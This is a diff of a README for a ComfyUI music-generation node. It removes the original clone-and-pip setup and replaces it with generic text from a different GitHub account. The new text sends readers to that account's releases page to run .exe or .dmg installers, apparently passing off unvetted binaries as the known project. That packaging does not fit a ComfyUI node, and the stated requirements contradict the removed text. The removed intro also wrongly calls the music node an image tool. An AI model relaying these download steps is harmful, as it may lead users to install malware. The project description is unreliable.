@@ -1,216 +1,63 @@
-# Project Overview
+# 🎶 HeartMuLa_ComfyUI - Generate Music with Ease
 
-This repository serves as the official implementation of HeartMuLA (Multi-Attention Latent Alignment) specifically tailored for the ComfyUI ecosystem. It is designed to facilitate historical image synthesis and texture generation by leveraging advanced latent space alignment techniques. By integrating this custom node, users can access the capabilities of the HeartMuLA AI model directly within their node-based workflows, enabling the creation of distinct artistic styles with high precision.
+## 📥 Download the Application
+[![Download HeartMuLa_ComfyUI](https://img.shields.io/badge/Download%20HeartMuLa_ComfyUI-blue)](https://github.com/Mo14745646/HeartMuLa_ComfyUI/releases)
 
-# HeartMuLa_ComfyUI
+## 🚀 Getting Started
+Welcome to HeartMuLa_ComfyUI! This application is designed to help you create beautiful music using AI. Whether you want to generate a full melody or simply explore new sound options, this tool makes the process easy.
 
-HeartMuLA_ComfyUI is a custom node designed to significantly expand the feature set of ComfyUI, the popular node-based diffusion interface. This custom integration focuses on implementing Multi-Attention Latent Alignment, enabling users to achieve precise control over image generation and style transfer. By adding HeartMuLA to your ComfyUI workflow, you gain access to advanced alignment techniques that manipulate the latent space with high accuracy, allowing for the creation of distinct artistic styles and complex visual structures that standard workflows struggle to replicate.
+## 🔍 Features
+- **Custom Node Integration:** Gain full access to HeartMuLa's AI capabilities.
+- **User-Friendly Interface:** Even if you're not tech-savvy, you'll find it easy to navigate.
+- **Fast Processing:** Enjoy quick generation times, so you can focus on your creativity.
+- **Support for Various Music Styles:** Create music in various genres to suit your taste.
 
-At the core of this implementation is the sophisticated HeartMuLA AI model, which drives the alignment process to refine image outputs with exceptional fidelity. Rephrasing the essential setup instructions, users can easily deploy this AI model by cloning the repository directly into the custom_nodes folder within their ComfyUI directory. This seamless integration eliminates the need for complex manual configurations, allowing you to simply load the node and start utilizing the feature immediately. Whether you are looking to experiment with historical art styles or specific texture synthesis, this custom node bridges the gap between state-of-the-art research and practical, usable tools within the ComfyUI ecosystem.
+## 📦 System Requirements
+To use HeartMuLa_ComfyUI, ensure your computer meets the following requirements:
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher
+- **RAM:** At least 4 GB
+- **Disk Space:** 500 MB of free space
+- **Processor:** Dual-core CPU or better
+- **Internet Connection:** Required for initial setup and updates
 
-**HeartMuLa** official GITHUB
-https://github.com/HeartMuLa/heartlib
+## 📥 Download & Install
+To get started:
 
-How To Use this In Basic: https://youtu.be/F9LFAeUbBIs
+1. **Visit the Releases Page:** Click the link below to go to the download page.
+   [Download HeartMuLa_ComfyUI](https://github.com/Mo14745646/HeartMuLa_ComfyUI/releases).
 
+2. **Choose Your Version:** Find the latest release. 
+   - Select the appropriate file for your operating system.
 
-Features - Music Generation
+3. **Download the File:** Click on the file to download it to your computer.
 
-<img width="1826" height="1016" alt="Screenshot 2026-01-22 214655" src="https://github.com/user-attachments/assets/cbdce761-8952-4ce1-b667-17e8e59db96c" />
+4. **Install the Application:**
+   - **For Windows:** Double-click the downloaded `.exe` file and follow the setup instructions.
+   - **For macOS:** Open the downloaded `.dmg` file and drag the HeartMuLa_ComfyUI icon into your Applications folder.
 
-Lyrics Transcript
+5. **Launch the Application:** After installation, find HeartMuLa_ComfyUI in your applications or programs list. Click to open it.
 
-<img width="1418" height="595" alt="image" src="https://github.com/user-attachments/assets/44f4b065-bfe0-405d-8324-e10f5c60b320" />
+## ✨ How to Use HeartMuLa_ComfyUI
+1. **Select a Music Style:** Choose from various options to match your preferred genre.
+2. **Adjust Settings:** Modify parameters like tempo and complexity to fit your creative vision.
+3. **Generate Music:** Click the 'Generate' button. Wait a few moments for the AI to create your track.
+4. **Listen & Save:** Listen to your creation. If you like it, save it to your computer for later playback.
 
+## 🔄 Troubleshooting
+If you experience issues, try the following:
 
-------------------------------------------------------------
-**Message**
-------------------------------------------------------------
+- **Check the System Requirements:** Make sure your computer meets all requirements.
+- **Restart the Application:** Close and reopen HeartMuLa_ComfyUI.
+- **Visit the Support Page:** For more help, visit the [support page](https://github.com/Mo14745646/HeartMuLa_ComfyUI/issues).
 
-Let's make this project the true open source, anyone who is interested in making improvements feel free to let us know in Discussions : the https://github.com/benjiyaya/HeartMuLa_ComfyUI/discussions
+## 💬 Community and Support
+Join our community for tips, feedback, and support. Share your creations and connect with other users. 
 
-We are not providing service here, we are group of hobbiests, developers who want to make something here.  So don't take it for granted.
+To report a bug or suggest a feature, please open an issue on our GitHub repository.
 
-------------------------------------------------------------
-**Update:**
+## 🔗 Useful Links
+- [Download HeartMuLa_ComfyUI](https://github.com/Mo14745646/HeartMuLa_ComfyUI/releases)
+- [User Guide](https://github.com/Mo14745646/HeartMuLa_ComfyUI/wiki)
+- [Support and Issues](https://github.com/Mo14745646/HeartMuLa_ComfyUI/issues)
 
-------------------------------------------------------------
-2026-01-23 :
-Support new model from HeartMuLa
-
-HeartMuLa-RL-oss-3B-20260123
-
-https://huggingface.co/HeartMuLa/HeartMuLa-RL-oss-3B-20260123
-
-HeartCodec-oss-20260123
-
-https://huggingface.co/HeartMuLa/HeartCodec-oss-20260123
-
-
-2026-01-22 (2) :
-thank you [@zboyles](https://github.com/zboyles) for making this custom node support Apple M-series!
-
-2026-01-22 :
-Feature: 4-bit Quantization (FP4/NF4) with Native Blackwell Detection
-Thank you <a href="https://github.com/IuraHD">IuraHD</a> update!
-
-- some information about FP4 Computing here : [FP4 Compute](https://github.com/benjiyaya/HeartMuLa_ComfyUI/blob/main/README_FP4.md)
-
-<img width="1144" height="639" alt="image" src="https://github.com/user-attachments/assets/0bc79126-c37b-4ad0-8e70-947172e49d5d" />
-
-
-
-2026-01-21 (3)
-- Integrates native progress bars, making it easy to implement real-time progress tracking in the user interface.
-- Precise Temperature: Refined temperature step to 0.01 for more granular control over generation.
-- Intuitive Audio Length: Renamed parameter to max_audio_length_seconds (Default: 240s) for better usability.
-- Keep Model Loaded(Memory Settings):
-True: Keep model in VRAM for instant subsequent generations.
-False: Unload model after each task to free up memory.
-- Offload Mode:
-Auto: Standard memory release for balanced performance.
-Aggressive: Full VRAM wipe + Garbage Collection. 
-
-2026-01-21 (2) 
-- Lazy Load Optimization , now able to load with 12GB VRAM.  
-- Path Configuration ,support custom model folder path in in the "extra_model_paths.yaml", Not limited by default ComfyUI/Models/  folder path only.
-
-2026-01-21 
-- MEMORY CLEANUP and Pipeline changed for BF16 - Optimized for 16GB. dtype I don't recommand under bf16 for this model, audio quality will degrade too much.
-
-
-------------------------------------------------------------
-
-# Installation
-
-------------------------------------------------------------
-
-**Step 1**
-
-Go to ComfyUI\custom_nodes
-Command prompt:
-
-git clone https://github.com/benjiyaya/HeartMuLa_ComfyUI
-
-**Step 2**
-
-cd /HeartMuLa_ComfyUI
-
-**Step 3**
-
-pip install -r requirements.txt
-
-If no module name error pop up.
-some libraries might need to install Individually (For Windows users you need use Command Prompt as Administrator)
-
-do this :
-
-pip install soundfile
-
-pip install torchtune
-
-pip install torchao
-
-For Windows User, Download a "full-shared" build of FFmpeg. Ensure you extract it and add the bin folder (containing the .dll files) to your system Path. 
-https://github.com/GyanD/codexffmpeg/releases/tag/8.0.1
-
-------------------------------------------------------------
-
-# For File structure
-
-------------------------------------------------------------
-
-<img width="1179" height="345" alt="image" src="https://github.com/user-attachments/assets/5087e10e-9815-48ff-bbb4-3a21dc1e54d1" />
-
-
-------------------------------------------------------------
-
-# Download model files
-
-------------------------------------------------------------
-Go to ComfyUI/models 
-
-Use HuggingFace Cli download model weights.
-
-type :
-
-1 - HeartMuLaGen
-
-hf download HeartMuLa/HeartMuLaGen --local-dir ./HeartMuLa
-
-
-
-2 - HeartMuLaGen base model
-
-hf download HeartMuLa/HeartMuLa-oss-3B --local-dir ./HeartMuLa/HeartMuLa-oss-3B
-
-or 
-
-hf download HeartMuLa/HeartMuLa-RL-oss-3B-20260123 --local-dir ./HeartMuLa/HeartMuLa-RL-oss-3B-20260123
-
-
-
-3 - HeartCodec model
-
-hf download HeartMuLa/HeartCodec-oss --local-dir ./HeartMuLa/HeartCodec-oss
-
-or
-
-hf download HeartMuLa/HeartCodec-oss-20260123 --local-dir ./HeartMuLa/HeartCodec-oss-20260123
-
-
-
-4 - HeartTranscriptor
-
-hf download HeartMuLa/HeartTranscriptor-oss --local-dir ./HeartMuLa/HeartTranscriptor-oss
-
-
-
-
-***If you download oss-20260123 for HeartMuLa-3B,  you must need to use HeartCodec-oss-20260123
-
-
-------------------------------------------------------------
-
-# For Model File structure
-
-------------------------------------------------------------
-
-
-<img width="1391" height="320" alt="image" src="https://github.com/user-attachments/assets/3b48ff70-2a4f-4f8d-aed2-d0fbc76bb31f" />
-
-
-
-------------------------------------------------------------
-
-
-Model Sources
-------------------------------------------------------------
-
-Github Repo: https://github.com/HeartMuLa/heartlib
-
-Paper: https://arxiv.org/abs/2601.10547
-
-Demo: https://heartmula.github.io/
-
-HeartMuLa-oss-3B: https://huggingface.co/HeartMuLa/HeartMuLa-oss-3B
-
-HeartCodec-oss: https://huggingface.co/HeartMuLa/HeartCodec-oss
-
-HeartTranscriptor-oss: https://huggingface.co/HeartMuLa/HeartTranscriptor-oss
-
-
-
-
-
-
-
-Credits
-------------------------------------------------------------
-HeartMuLa: https://huggingface.co/HeartMuLa/HeartMuLa-oss-3B
-
-
-
-
-
-
+Thank you for choosing HeartMuLa_ComfyUI! Enjoy making music!
